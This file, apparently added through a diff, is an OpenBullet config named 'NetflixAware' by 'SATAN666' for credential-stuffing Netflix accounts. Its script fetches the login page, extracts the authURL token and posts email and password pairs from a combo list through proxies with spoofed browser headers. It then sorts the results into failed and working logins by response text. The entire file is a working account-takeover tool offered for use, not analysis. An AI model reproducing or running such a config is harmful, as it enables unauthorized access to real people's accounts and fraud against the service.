@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "NetflixAware",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T13:51:23.7174359+02:00",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.netflix.com/login" ParseQuery=TRUE 
+  
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" CSS "[name=\"authURL\"]" "value" EncodeOutput=TRUE -> VAR "AUTH" 
+
+PARSE "<ADDRESS>" LR "" "" -> VAR "POST" 
+
+REQUEST POST "<POST>" 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=password%2CrememberMe%2CnextPage%2CshowPassword%2Cemail&authURL=<AUTH>&nextPage=&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Origin: https://www.netflix.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password" 
+    KEY "Sorry, we can't find an account with this email address. Please try again" 
+  KEYCHAIN Success OR 
+    KEY "watching?" 
+
